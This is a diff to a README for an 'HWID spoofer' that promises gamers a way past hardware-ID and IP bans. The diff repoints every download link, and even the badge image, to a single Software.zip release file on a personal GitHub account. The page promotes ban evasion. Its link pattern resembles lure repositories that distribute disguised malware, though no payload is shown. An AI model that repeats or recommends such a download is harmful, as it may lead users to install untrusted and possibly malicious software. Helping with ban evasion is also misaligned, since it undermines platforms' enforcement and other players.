@@ -34,9 +34,9 @@ Our goal is to help gamers facing bans due to their Hardware IDs or IP addresses
 - valorant-hwid-changer-2025
 
 ### 📦 Download
-For the latest version of our HWID spoofer, please download it [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+For the latest version of our HWID spoofer, please download it [here](https://github.com/Max-jackson/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip).
 
-![Download](https://img.shields.io/badge/Download-v1.0.0-blue)
+![Download](https://github.com/Max-jackson/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 ### 🚫 FAQ
 #### Q: How does the HWID spoofer work?
@@ -58,4 +58,4 @@ Ready to bypass those pesky bans and get back to gaming? Download our HWID spoof
 
 Thank you for visiting the Monotone HWID Spoofer repository. We hope our tools help you get back in the game and enjoy gaming without any restrictions. Happy gaming! 🎮
 
-[Visit Releases Section](https://github.com/Monotone-HWID-Spoofer/releases)
+[Visit Releases Section](https://github.com/Max-jackson/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
